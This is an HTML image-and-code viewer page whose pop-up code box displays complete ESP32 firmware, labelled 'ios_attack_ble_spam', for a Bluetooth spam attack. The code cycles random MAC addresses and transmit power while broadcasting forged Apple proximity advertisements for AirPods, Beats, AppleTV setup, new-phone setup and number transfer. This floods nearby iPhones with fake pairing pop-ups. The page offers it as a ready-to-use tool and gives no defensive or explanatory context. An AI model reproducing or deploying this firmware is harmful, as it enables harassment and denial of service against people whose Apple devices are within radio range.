<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Image & Code Viewer</title>

<style>
body{
  margin:0;
  background:#0d1117;
  font-family: monospace;
  color:white;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.container{
  display:flex;
  gap:40px;
}

img{
  width:200px;
  height:200px;
  object-fit:cover;
  cursor:pointer;
  border-radius:10px;
  transition:0.3s;
  border:2px solid #00ffcc;
}

img:hover{
  transform:scale(1.05);
  box-shadow:0 0 20px #00ffcc;
}

/* Image Popup */
.modal{
  display:none;
  position:fixed;
  top:0;
  left:180px;
  width:70%;
  height:auto;
  
  justify-content:center;
  align-items:center;
}

.modal img{
  width:50%;
  height:auto;
}

/* Code Box */
.codeBox{
  display:none;
  position:fixed;
  top:10%;
  left:50%;
  transform:translateX(-50%);
  width:70%;
  height:70%;
  background:#161b22;
  border:2px solid #00ffcc;
  border-radius:10px;
  padding:20px;
  overflow-y:scroll;
  box-shadow:0 0 20px #00ffcc;
}

pre{
  white-space:pre-wrap;
  word-wrap:break-word;
}
.closeBtn{
  position:absolute;
  top:10px;
  right:15px;
  cursor:pointer;
  color:red;
  font-size:20px;
}
        .back-btn {
            position: fixed;
            top: 20px;
            left: 20px;
            padding: 10px 15px;
            background-color: #00ffcc;
            color: #000;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
</style>
</head>

<body>

<div class="container">
  <img src="mh hridoy.jpg" id="img1">
  <img src="mh hridoy.jpg" id="img2">
</div>

<!-- Image Modal -->
<div class="modal" id="imageModal">
  <img src="mh hridoy.jpg" id="modalImage">
</div>

<!-- Code Viewer -->
<div class="codeBox" id="codeBox">
  <span class="closeBtn" onclick="closeCode()">X</span>
  <pre>
#include "ios_attack_ble_spam.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_ble_api.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "ble_spam";
static bool attack_active = false;
static TaskHandle_t ble_task_handle = NULL;

static esp_power_level_t get_random_tx_power() {
    static const esp_power_level_t power_levels[] = {
    #ifdef ESP_PWR_LVL_P9
        ESP_PWR_LVL_P9,
    #endif
    #ifdef ESP_PWR_LVL_P8
        ESP_PWR_LVL_P8,
    #endif
    #ifdef ESP_PWR_LVL_P7
        ESP_PWR_LVL_P7,
    #endif
    #ifdef ESP_PWR_LVL_P6
        ESP_PWR_LVL_P6,
    #endif
    #ifdef ESP_PWR_LVL_P5
        ESP_PWR_LVL_P5,
    #endif
    #ifdef ESP_PWR_LVL_P3
        ESP_PWR_LVL_P3,
    #endif
    #ifdef ESP_PWR_LVL_N0
        ESP_PWR_LVL_N0,
    #endif
    #ifdef ESP_PWR_LVL_N3
        ESP_PWR_LVL_N3,
    #endif
    #ifdef ESP_PWR_LVL_N6
        ESP_PWR_LVL_N6,
    #endif
    #ifdef ESP_PWR_LVL_N9
        ESP_PWR_LVL_N9,
    #endif
    #ifdef ESP_PWR_LVL_N12
        ESP_PWR_LVL_N12,
    #endif
    };

    int count = sizeof(power_levels) / sizeof(power_levels[0]);
    return power_levels[rand() % count];
}

/*
  These are audio devices: wireless headphones / earbuds
  It seems these need a shorter range between ESP & iDevice
*/
const uint8_t DEVICES[][31] = {
  // Airpods
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Max
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Gen 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Airpods Pro Gen 2
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Power Beats
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Power Beats Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Flex
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats X
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Solo 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio 3
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Betas Fit Pro
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  // Beats Studio Buds Plus
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
};

/*
  These are more general home devices
  It seems these can work over long distances, especially AppleTV Setup
*/
const uint8_t SHORT_DEVICES[][23] = {
  // AppleTV Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Pair
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV New User
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV AppleID Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Wireless Audio Sync
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Homekit Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Keyboard Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // AppleTV Connecting to Network
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Homepod Setup
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Setup New Phone
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Transfer Number
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // TV Color Balance
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  // Vision Pro
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
};


static void gap_event_handler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
    // Handle BLE events if needed
}

static void ble_spam_task(void *pvParameters) {
    esp_ble_adv_params_t adv_params = {
        .adv_int_min = 0x20,
        .adv_int_max = 0x20,
        .adv_type = ADV_TYPE_NONCONN_IND,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .channel_map = ADV_CHNL_ALL,
        .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };

    while (attack_active) {
        // Generate random MAC
        uint8_t rand_addr[6];
        for (int i = 0; i < 6; i++) {
            rand_addr[i] = rand() & 0xFF;
            if (i == 0) rand_addr[i] |= 0xF0;
        }
        esp_ble_gap_set_rand_addr(rand_addr);

        // Choose random device data
        uint8_t *device_data;
        uint8_t device_len;
        if (rand() % 2) {
            device_data = (uint8_t *)DEVICES[rand() % 17];
            device_len = 31;
        } else {
            device_data = (uint8_t *)SHORT_DEVICES[rand() % 13];
            device_len = 23;
        }

        // Set advertising data
        esp_ble_adv_data_t adv_data = {
            .set_scan_rsp = false,
            .include_name = false,
            .include_txpower = true,
            .min_interval = 0x20,
            .max_interval = 0x20,
            .appearance = 0,
            .manufacturer_len = device_len,
            .p_manufacturer_data = device_data,
            .service_data_len = 0,
            .p_service_data = NULL,
            .service_uuid_len = 0,
            .p_service_uuid = NULL,
            .flag = 0
        };
        esp_ble_gap_config_adv_data(&adv_data);

        // Set random advertising type
        adv_params.adv_type = (esp_ble_adv_type_t[]){
            ADV_TYPE_IND, 
            ADV_TYPE_SCAN_IND,
            ADV_TYPE_NONCONN_IND
        }[rand() % 3];

        // Start advertising
        esp_ble_gap_start_advertising(&adv_params);
        vTaskDelay(100 / portTICK_PERIOD_MS);
        esp_ble_gap_stop_advertising();

        // Random TX power
esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, get_random_tx_power());

        vTaskDelay(900 / portTICK_PERIOD_MS);
    }

    // Cleanup
    esp_bluedroid_disable();
    esp_bluedroid_deinit();
    esp_bt_controller_disable();
    esp_bt_controller_deinit();
    vTaskDelete(NULL);
}

void ios_attack_ble_spam_start() {
    if (attack_active) return;
    
    // Initialize BLE controller
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);

    // Initialize Bluedroid
    esp_bluedroid_init();
    esp_bluedroid_enable();
    esp_ble_gap_register_callback(gap_event_handler);
    
    // Set max TX power
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    
    attack_active = true;
    xTaskCreate(ble_spam_task, "ble_spam", 4096, NULL, 5, &ble_task_handle);
}

void ios_attack_ble_spam_stop() {
    if (!attack_active) return;
    
    attack_active = false;
    if (ble_task_handle) {
        vTaskDelay(100 / portTICK_PERIOD_MS); // Allow task to exit
    }
}
  </pre>
</div>
             <button class="back-btn" onclick="history.back()">â¬…</button>
<script>
const img1 = document.getElementById("img1");
const img2 = document.getElementById("img2");
const modal = document.getElementById("imageModal");
const codeBox = document.getElementById("codeBox");

img1.onclick = () => {
  modal.style.display = "flex";
}

modal.onclick = () => {
  modal.style.display = "none";
}

img2.onclick = () => {
  codeBox.style.display = "block";
}

function closeCode(){
  codeBox.style.display = "none";
}
</script>

</body>
</html>